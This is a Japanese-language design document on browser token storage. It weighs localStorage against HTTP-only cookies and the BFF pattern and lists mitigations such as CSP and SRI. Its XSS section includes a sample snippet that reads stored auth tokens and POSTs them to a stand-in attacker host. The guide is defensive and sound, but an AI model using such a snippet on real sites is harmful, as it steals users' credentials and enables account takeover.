# トークンストレージセキュリティ

## 概要

ブラウザ環境におけるトークンの保存方法は、アプリケーション全体のセキュリティに直結する重要な設計判断です。本ドキュメントでは、各ストレージ方式のリスクと推奨アプローチについて説明します。

## localStorage のリスク

`localStorage` はブラウザが提供する永続的なキーバリューストレージですが、トークン保存に使用する場合、以下のセキュリティリスクがあります。

### 問題点

- **JavaScript から無制限にアクセス可能**: 同一オリジン上のすべての JavaScript コードが `localStorage` の内容を読み取れます。これは正規のコードだけでなく、XSS 攻撃によって注入された悪意のあるスクリプトも含みます。
- **永続的な保存**: `localStorage` のデータはブラウザを閉じても保持されるため、トークンが長期間にわたり露出するリスクがあります。
- **同一オリジンポリシーのみに依存**: Cookie のような `HttpOnly` や `SameSite` 属性による追加の保護機構がありません。

### 影響

攻撃者が XSS 脆弱性を悪用した場合、`localStorage` に保存されたアクセストークンやリフレッシュトークンを窃取し、ユーザーになりすましてAPIリクエストを送信できます。

## XSS 攻撃ベクトル

XSS（クロスサイトスクリプティング）攻撃は、`localStorage` に保存されたトークンを窃取する主要な手段です。

### 主な攻撃経路

1. **Stored XSS（永続型）**: ユーザー入力がサニタイズされずにデータベースに保存され、他のユーザーのページに表示される場合、攻撃者は `localStorage` から直接トークンを読み取るスクリプトを埋め込めます。

2. **Reflected XSS（反射型）**: 悪意のあるURLパラメータがページに反映される場合、被害者がリンクをクリックした瞬間にトークンが窃取されます。

3. **サードパーティライブラリ経由**: npm パッケージのサプライチェーン攻撃により、依存ライブラリに悪意のあるコードが混入する可能性があります。この場合、`localStorage` のデータは容易にアクセスされます。

### 攻撃コード例

```javascript
// 攻撃者が XSS を通じて実行するコードの例
// localStorage に保存されたトークンを外部サーバーに送信する
const tokens = localStorage.getItem('k1s0_auth_tokens');
fetch('https://attacker.example.com/steal', {
  method: 'POST',
  body: tokens,
});
```

## BFF パターンの推奨

BFF（Backend for Frontend）パターンは、トークン管理をサーバーサイドに移譲することで、ブラウザ上のトークン露出を完全に排除するアーキテクチャです。

### 仕組み

1. **クライアント** はBFFサーバーに認証リクエストを送信します。
2. **BFFサーバー** が OAuth プロバイダーと直接通信し、トークンを取得します。
3. **トークンはサーバーサイド**（メモリ、Redis、暗号化ストレージ等）に保存されます。
4. クライアントには **HTTP-only Cookie でセッションID** のみが発行されます。
5. API リクエスト時、BFFがセッションIDからトークンを解決し、バックエンドAPIに転送します。

### メリット

- トークンがブラウザの JavaScript に一切露出しないため、XSS によるトークン窃取が不可能になります。
- トークンのリフレッシュロジックをサーバーサイドに集約でき、クライアントの実装が簡素化されます。
- サーバーサイドでトークンの暗号化や監査ログの記録が容易です。

### デメリット

- BFFサーバーの運用・管理コストが発生します。
- アーキテクチャの複雑性が増加します。
- サーバーサイドのセッション管理が必要になります。

## HTTP-only Cookie アプローチ

BFF を導入せずに Cookie ベースでトークンを保護する方法です。

### 推奨する Cookie 属性

| 属性 | 値 | 目的 |
|------|------|------|
| `HttpOnly` | `true` | JavaScript からの Cookie アクセスを遮断 |
| `Secure` | `true` | HTTPS 通信のみで Cookie を送信 |
| `SameSite` | `Strict` または `Lax` | CSRF 攻撃を軽減 |
| `Path` | `/` または最小限のパス | Cookie のスコープを限定 |
| `Max-Age` | トークンの有効期限に合わせる | 不要な長期保存を防止 |

### 注意点

- サーバーサイドで Cookie を設定するエンドポイントが必要です。
- CSRF 対策として `SameSite` 属性に加えて、CSRFトークンの併用を推奨します。

## ストレージ方式比較表

| 項目 | localStorage | sessionStorage | HTTP-only Cookie | BFF パターン |
|------|:---:|:---:|:---:|:---:|
| **XSS 耐性** | 低 | 低 | 高 | 最高 |
| **CSRF 耐性** | 高 | 高 | 中（要対策） | 中（要対策） |
| **永続性** | ブラウザ閉じても保持 | タブを閉じると消失 | 設定による | サーバーサイド管理 |
| **JS からのアクセス** | 可能 | 可能 | 不可 | 不可 |
| **実装の容易さ** | 簡単 | 簡単 | 中程度 | 複雑 |
| **サーバー依存** | なし | なし | あり | あり |
| **推奨用途** | 開発・テスト | 一時データ | 中規模本番 | 大規模本番 |

## 推奨事項

### 開発・テスト環境

- `LocalStorageTokenStore` を使用して問題ありません。
- 迅速な開発サイクルを優先し、セキュリティよりも利便性を重視します。

### 本番環境

- **推奨**: BFF パターンを採用し、トークンをサーバーサイドで管理する。
- **次善策**: HTTP-only Cookie でトークンを保存し、適切な Cookie 属性を設定する。
- **非推奨**: `localStorage` や `sessionStorage` にトークンを保存する。

### 共通の緩和策

どのストレージ方式を使用する場合でも、以下の対策を併用してください。

- **Content Security Policy（CSP）**: `script-src` ディレクティブで許可するスクリプトソースを制限し、インラインスクリプトの実行を防止する。
- **入力のサニタイズ**: ユーザー入力を適切にエスケープし、XSS 脆弱性を排除する。
- **サブリソース完全性（SRI）**: 外部スクリプトのハッシュ値を検証し、改ざんを検知する。
- **依存ライブラリの監査**: `npm audit` 等で定期的にサプライチェーンの脆弱性を確認する。
